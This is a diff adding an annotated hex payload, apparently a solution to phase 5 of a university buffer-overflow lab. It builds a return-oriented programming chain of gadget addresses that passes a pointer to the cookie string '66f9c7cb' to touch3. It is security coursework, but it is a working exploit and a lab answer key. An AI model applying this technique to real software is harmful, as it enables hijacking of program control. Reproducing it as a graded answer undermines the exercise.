@@ -1,0 +1,26 @@
+/* Phase 5: ROP touch3 with pointer to cookie string "66f9c7cb" */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* movq %rsp, %rax ; ret  (0x401fc7) */
+c7 1f 40 00 00 00 00 00
+/* movq %rax, %rdi ; ret  (0x401e81)  rdi = rsp base */
+81 1e 40 00 00 00 00 00
+/* popq %rax ; nop ; ret   (0x401e6c) */
+6c 1e 40 00 00 00 00 00
+/* offset from rsp base to cookie string = 0x48 */
+48 00 00 00 00 00 00 00
+/* movl %eax, %edx ; cmpb %al,%al ; ret (0x401f30) */
+30 1f 40 00 00 00 00 00
+/* movl %edx, %ecx ; nop ; ret (0x401ed2) */
+d2 1e 40 00 00 00 00 00
+/* movl %ecx, %esi ; orb %bl,%bl ; ret (0x401f26) */
+26 1f 40 00 00 00 00 00
+/* lea (%rdi,%rsi,1),%rax ; ret (0x401ec8)  rax = rsp + 0x48 */
+c8 1e 40 00 00 00 00 00
+/* movq %rax, %rdi ; ret  (0x401e81) */
+81 1e 40 00 00 00 00 00
+/* touch3 (0x401d14) */
+14 1d 40 00 00 00 00 00
+/* "66f9c7cb" + NUL */
+36 36 66 39 63 37 63 62 00
